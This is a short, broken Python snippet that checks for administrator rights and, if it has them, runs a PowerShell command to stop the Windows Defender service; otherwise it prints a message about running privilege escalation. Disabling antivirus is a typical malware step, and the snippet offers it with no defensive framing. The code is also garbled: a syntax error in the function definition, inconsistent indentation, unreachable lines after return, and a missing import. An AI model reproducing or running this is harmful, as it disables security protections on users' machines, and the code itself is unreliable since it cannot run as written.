import ctypes, os
def go();
   try:
       is_admin = (os.getuid() == 0)
   except AttributeError:
       is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
   return is_admin
  if is_admin:
    subprocess.call("powershell -c sc stop WinDefend", shell=True)
  else:
    print("Running privelage escalation")
      
